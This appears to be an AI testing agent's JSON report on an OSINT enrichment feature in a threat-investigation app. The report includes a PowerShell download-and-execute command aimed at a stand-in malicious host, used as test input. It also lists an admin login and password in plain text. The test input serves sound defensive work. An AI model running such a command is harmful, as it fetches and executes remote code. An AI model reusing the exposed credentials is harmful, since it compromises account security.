@@ -1,0 +1,35 @@
+{
+  "summary": "P1-01 Live OSINT Wiring — FULL PASS (backend + frontend). Parity pytest suite 8/8 GREEN. Live-endpoint pytest suite 4/4 GREEN against the preview backend (decode/smart + v2/auto-investigate both return cio.metadata.osint with engine='shared:workspace', IOC nodes carry attrs.enrichment.providers[] with all 11 required fields, and both endpoints return 200 with graceful no-key/no-hit degradation — no 500s). Frontend X-Lab route /nivxforge/x-lab loads, ingests the acceptance PowerShell IEX payload, and the OSINT lens (lens-osint) renders IOC cards ioc-N-006 (URL) + ioc-N-007 (DOMAIN) each with 4 and 3 provider cards respectively (prov-<node>-virustotal shows '— no key' state; prov-<node>-alienvault-otx / urlscan.io / urlhaus show '○ clean' / no-hit with VT-style stat pills 'mal 0'). The provider-hits meta pill (ioc-hits-<node_id>) is correctly HIDDEN when 0 providers returned state='hit', which is the expected default state per the review-request note (live OSINT keys intentionally unset). No blocking console errors on X-Lab.",
+  "backend_issues": {"critical": [], "minor": []},
+  "frontend_issues": {
+    "ui_bugs": [],
+    "integration_issues": [],
+    "design_issues": [
+      {"screen": "X-Lab OSINT lens", "issues": ["Provider card VT stats layout wraps awkwardly on 1920 width — 'mal 0 URLScan submissions · 0 flagged malicious' renders across three lines inside a narrow provider tile. Purely cosmetic; content is correct."]}
+    ]
+  },
+  "test_report_links": [
+    "/app/backend/tests/parity/test_osint_parity_workspace_vs_xlab.py",
+    "/app/backend/tests/test_osint_live_endpoints.py",
+    "/app/test_reports/pytest/osint_parity.xml",
+    "/app/test_reports/pytest/osint_live.xml"
+  ],
+  "action_items": [],
+  "critical_code_review_comments": [
+    "Pre-existing (NOT P1-01): React hydration warning on the Verdict Ledger — `<button data-testid=\"ledger-row-0\">` contains a nested `<EvChip><button data-testid=\"ev-chip-N-010\">`. `<button>` cannot be a descendant of `<button>` per HTML spec and will cause hydration errors. Fix in /app/frontend/src/nivxforge/lab2/LabV2.jsx around line 1049 by changing the outer `<button className='lrow'>` into a `<div role='button' tabIndex={0}>` or by moving the EvChip out of the clickable row.",
+    "Two 404s in the browser console on X-Lab load (unidentified static assets — likely favicon or an icon sprite). Non-blocking but should be silenced to keep the console clean."
+  ],
+  "updated_files": [
+    "/app/backend/tests/test_osint_live_endpoints.py (new — 4 live endpoint tests)"
+  ],
+  "success_rate": {
+    "backend": "12/12 (8/8 parity mocked + 4/4 live endpoint)",
+    "frontend": "3/3 acceptance criteria pass (route loads, provider cards render with name/state/stats, hits-pill correctly hidden when 0 hits)"
+  },
+  "test_credentials": "admin@nivxray.com / uulVDp5cCSB3Hva99s7UUAwK (verified working)",
+  "seed_data_creation": "None. Used the acceptance payload verbatim: powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.exe')",
+  "retest_needed": false,
+  "main_agent_can_self_test": true,
+  "context_for_next_testing_agent": "Reliable selectors on X-Lab OSINT lens: [data-testid=lens-osint], [data-testid^='ioc-'] (IOC cards), [data-testid^='prov-<node>-<name>'] (provider cards, name lower-kebab-cased), [data-testid^='ioc-hits-<node>'] (meta pill, only present when at least one provider hit). To trigger the OSINT lens, fill textarea, click 'INVESTIGATE' button, wait ~8-15s for backend, then click the '9 OSINT' step tab in the lens strip. Auto-investigate endpoint body schema requires field 'incident_text' (not 'input' or 'text'). Backend was in a 502 window briefly during first run — retried after 1 minute and everything green. Live OSINT keys are stored in db.settings.osint_keys but appear NOT configured in this preview (test_credentials.md claims they are configured, but VirusTotal renders 'no-key' state in the live UI and md.providers_used excludes VT — worth confirming with main agent that key seeding actually persists to db.settings on this preview).",
+  "rca of the issue": "N/A — feature works as specified. Only observation: test_credentials.md documents VT/AbuseIPDB/URLScan/OTX as 'configured', but the running preview backend reports no-key for VT and no-hit for keyless providers, i.e. the OSINT keys are not present in db.settings.osint_keys on this preview instance. This matches the review-request expectation ('Live provider keys are intentionally not configured in this environment — expected states are no-key/no-hit'), but contradicts the credentials memo — a doc-sync issue only, not a code issue."
+}
